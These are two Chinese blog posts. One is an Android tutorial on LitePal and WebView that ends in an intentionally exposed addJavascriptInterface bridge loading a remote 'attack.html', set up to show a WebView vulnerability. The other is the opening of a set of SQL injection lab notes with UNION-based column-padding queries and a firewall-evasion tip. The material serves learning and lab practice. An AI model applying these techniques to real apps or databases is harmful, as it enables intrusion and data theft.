class="regexp">&lt;/mani</span>fest&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将项目的<code>application</code>配置为<code>org.litepal.LitePalApplication</code>，这样才能让LitePal的所有功能都可以正常工作</p><h4 id="创建和升级数据库">创建和升级数据库</h4><p>创建Book类，定义好相关属性（表的列名）</p><p>在<code>litepal.xml</code>的<code>&lt;list&gt;</code>标签内添加<code>&lt;mapping class=&quot;com.example.litepaltest.Book&quot;&gt;&lt;/mapping&gt;</code></p><p><mapping>标签：声明配置的映射模型类，使用完整类名，有多少个映射模型类，就有多少个&lt;mapping 标签</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">extends</span> <span class="title class_">DataSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义属性，即列名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainActivity中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                </span><br><span class="line">                Connector.getDatabase();</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>Connector.getDatabase();：创建数据库</p><h4 id="添加数据-2">添加数据</h4><p>LitePal进行表管理操作时不需要模型类有任何的继承结构，但是进行CRUD操作时就不行了，必须要让 相关表类 继承自DataSupport 类才行，如Book表需要让Book类继承<code>DataSupport</code>类，然后调用<code>.save()</code>方法将数据存入数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">                book.setName(<span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                book.setAuthor(<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                book.setPages(<span class="number">454</span>);</span><br><span class="line">                book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Unknow&quot;</span>);</span><br><span class="line">                book.save();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="更新数据-2">更新数据</h4><p>对于LitePal来说，对象是否已存储就是根据调用model.isSaved() 方法的结果来判断的，返回true 就表示已存储，返回false 就表示未存储。</p><p>方法一：对已存储的对象，重新调用<code>.save()</code>方法进行更新</p><p>方法二：更新从数据库中查到的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">                book.setPrice(<span class="number">14.95</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Anchor&quot;</span>);</span><br><span class="line">                book.updateAll(<span class="string">&quot;name = ? and author = ?&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>想把一个字段的值更新成默认值时，是不可以使用上面的方式来set 数据的。将为数据更新成默认值的操作，LitePal统一提供了一个setToDefault() 方法，然后传入相应的列名就可以实现了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">book.setToDefault(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure><h4 id="删除数据-2">删除数据</h4><ul><li><p>方法一</p><p>调用过save() 方法的对象，或者是通过LitePal提供的查询API查出来的对象，都是可以直接使用delete() 方法来删除数据的。</p></li><li><p>方法二</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataSupport.deleteAll(Book.class, <span class="string">&quot;price &lt; ?&quot;</span>, <span class="string">&quot;15&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里调用了DataSupport.deleteAll() 方法来删除数据，其中deleteAll() 方法的第一个参数用于指定删除哪张表中的数据，Book.class就意味着删除Book表中的数据，后面的参数用于指定约束条件。</p><h4 id="查询数据-2">查询数据</h4><p>findAll：返回Book对象类型的List集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                List&lt;Book&gt; books = DataSupport.findAll(Book.class);</span><br><span class="line">                <span class="keyword">for</span> (Book book: books) &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + book.getName());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + book.getAuthor());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + book.getPages());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + book.getPrice());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book press is &quot;</span> + book.getPress());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h2 id="WebView">WebView</h2><h3 id="基本使用">基本使用</h3><p><strong>本地加载</strong></p><p>布局文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;WebView</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">         /&gt;</span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> findViewById(web_view);</span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webview.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">        webview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                view.loadUrl(url);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>清单文件允许联网</p><p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</code></p>  <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line"><span class="string">...</span></span><br><span class="line">android<span class="function">:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line">&lt;<span class="string">/application</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>远程加载</strong></p><p>通过一个js脚本调用java中的代码</p><p>js内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Android调用js</strong></p><p>js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p>调用成功</p><p><img src="assets/905443_JWE7TE67SA736UJ.png" alt="image-20220729094802205"></p><p>还可以使用evaluateJavascript来加载js脚本内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载js中函数</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="WebView漏洞">WebView漏洞</h3><p><img src="assets/905443_C8YTUCX4746WZHB.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>SQL注入</h1><ul><li>在phpstudy中搭建sqli-labs和phpMyAdmin</li></ul><h2 id="前置知识">前置知识</h2><p>一些sql指令掌握</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p   登录数据库</span><br><span class="line">show databases;    查看数据库</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> 自定义库名 charset utf8 创库并选择字符集</span><br><span class="line"><span class="keyword">create</span> table 表名（属性名 类型，属性名 类型...）; 创表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> 库名  删数据库</span><br><span class="line"><span class="keyword">show</span> full columns <span class="keyword">from</span> 表名 查看数据表信息</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名  查看数据表列表</span><br><span class="line"><span class="keyword">rename</span> table 原表名 <span class="keyword">to</span> 新表名</span><br><span class="line"><span class="keyword">alter</span> table <span class="keyword">user</span> character <span class="keyword">set</span> utf8 修改字符级</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 （属性） <span class="keyword">values</span> (对应赋值)</span><br><span class="line"><span class="keyword">alter</span> table 表名 add 要添加的列名 decimal(<span class="number">8</span>,<span class="number">2</span>) 表中添加一列 并且最大<span class="number">8</span>位，小数点<span class="number">2</span>位</span><br><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">set</span> 列名 = 赋值;  更新数据</span><br><span class="line">alter table 表名 <span class="keyword">drop</span> 列名  删除列</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> + 限定条件 删除行</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 删除表</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">3</span> 限制为从第<span class="number">1</span>行开始显示<span class="number">3</span>行 表从第<span class="number">0</span>行开始</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span>查询 列数必须要相等</span><br><span class="line">如果某一个表列数少，可以如下：（users有<span class="number">3</span>列，emails有<span class="number">2</span>列）</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> *,<span class="number">3</span> <span class="keyword">from</span> emails <span class="keyword">where</span> id = <span class="number">1</span> 或者</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> emails <span class="keyword">where</span> id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> 分组 可以使用 <span class="keyword">group</span> <span class="keyword">by</span> + 数字 怼列数，不容易被防火墙发现</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> + 数字 默认按照第几列升序排序  <span class="keyword">desc</span>==&gt;降序</span><br><span class="line"></span><br><span class="line">group_concat   多行变一行 </span><br><span class="line"><span class="keyword">select</span> group_concat(xx,xx,xx) <span class="keyword">from</span> 表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()  当前数据库名称</span><br><span class="line"><span class="keyword">select</span> version()   当前数据库版本</span><br></pre></td></tr></table></figure><h2 id="注入学习">注入学习</h2><h3 id="什么是注入">什么是注入</h3><p>通过把sql命令插入到web表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的sql命令，进一步得到相应数据信息。</p><p>即通过构造一条精巧的语句，来查询想到得到的信息</p><h3 id="注入分类">注入分类</h3><h4 